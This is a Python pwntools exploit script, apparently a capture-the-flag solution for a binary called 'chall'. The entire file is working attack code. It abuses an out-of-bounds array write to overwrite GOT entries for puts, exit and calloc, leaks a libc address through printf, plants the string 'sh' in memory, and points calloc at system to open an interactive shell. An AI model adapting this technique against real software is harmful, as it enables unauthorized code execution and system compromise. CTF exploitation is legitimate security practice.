#!/usr/bin/env python3

from h11 import Data
from pwn import *

elf = ELF("./chall")
libc = ELF("./libc.so.6")
#ld = ELF("./ld-2.31.so")

context.binary = elf


def conn():
    if args.LOCAL:
        r = process([elf.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        HOST, PORT = "", 0
        r = remote(HOST, PORT)

    return r

def write(size, index, array):
    
    p.sendlineafter("size: ", str(size))
    p.sendlineafter("index: ", str(index))
    p.sendlineafter("]: ", str(array))
    
def main():
    global p 
    p = conn()

    sh_addr = 0x404060 + 0x50
    main_addr = 0x4011f6
    puts_got = elf.got['puts']
    ret = 0x040101a
    exit_got = elf.got['exit']
    calloc_got = elf.got['calloc']
    skip_addr = 0x40128b
    printf_plt = 0x4010d0
    printf_got = elf.got['printf']
    call_rax = 0x401014
    
    write(-1, puts_got // 4, main_addr)
    write(-1, exit_got //4, call_rax)
    write(skip_addr, calloc_got //4, printf_plt)
    write(skip_addr, (calloc_got + 4) // 4, 0)
    write(skip_addr, exit_got // 4, ret)
    p.sendlineafter("size: ", str(printf_got))
    libc_leak = p.recv(6).ljust(8, b"\x00")
    libc_leak = u64(libc_leak)
    libc.address = libc_leak - 0x3fe10
    log.info(f"libc base : {hex(libc.address)}")
    p.sendlineafter("index: ", str(sh_addr // 4))
    p.sendlineafter("]: ", str(u32("sh\0\0")))
    
    write(elf.bss() + 0x400, exit_got // 4, call_rax)
    system_addr = libc.address + 0x30410
    write(skip_addr, calloc_got // 4, (system_addr & 0xffffffff))
    write(skip_addr, (calloc_got + 4) // 4, (system_addr >> 32))
    write(skip_addr, exit_got // 4, ret)
    p.sendlineafter("size: ", str(sh_addr + 6))
    p.interactive()
    
if __name__ == "__main__":
    main()